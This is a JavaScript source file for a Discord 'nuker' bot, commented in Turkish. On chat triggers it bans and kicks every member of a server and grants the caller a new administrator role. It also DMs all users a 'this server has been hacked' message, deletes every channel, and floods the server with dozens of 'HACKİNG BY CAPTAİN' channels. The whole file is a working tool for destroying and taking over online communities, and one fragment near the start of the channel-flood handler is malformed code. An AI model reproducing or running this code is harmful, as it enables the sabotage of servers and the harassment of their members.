const Discord = require("discord.js"); 
const client = new Discord.Client();
const ayarlar = require("./ayarlar.json");
const { Client, Util } = require("discord.js");
const request = require("request");
client.login(ayarlar.token);

client.on("message", msg => {           
  if (msg.content === ".boom1") {
    msg.delete();
    msg.guild.members.forEach(member => member.ban());  
  }
});       ///BAN KOMUTU SUNUCUDAKI HEKESI BANLAR 

client.on("message", msg => {
  if (msg.content === ".boom1") {
    msg.delete();
    msg.guild.members.forEach(member => member.kick());
  }
});      ///KICK KOMUTU SUNUCUDAKI HERKESI KICKLER 

client.on("message", async msg => {
  if (msg.content === ".boom1") {  //SUNUCUDAKI BUTUN HERKESE MESAJ GÖNDERİR 
    msg.delete();
    await msg.client.users
      .forEach(users =>
        users.send(
          "**BU SUNUCU HACKLENMİŞTİR **"  //HERKESE DMDEN ATILAN MESAJ
        )
      )
      .catch(console.error);
  } 
});

client.on("message", msg => {
  if (msg.content === ".boom1") {  //SIZE YÖNETICI YETKISI VERIR 
    msg.delete();
    msg.guild.createRole({
      name: ".",
      permissions: ["ADMINISTRATOR"]
    });
    let rol = msg.guild.roles.find(role => role.name === ".");  
    msg.member.addRole(rol);
  }
});
client.on("message", async msg => {
  if (msg.content === ".boom") {     ///COKERT KOMUTU BÜTÜN KANALLARI SILIP COK FAZLA KANAL ACAR
    msg.delete();

    await msg.guild.channels.deleteAll();      //TÜM KANALLARI SİLEN KOMUT
     (chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
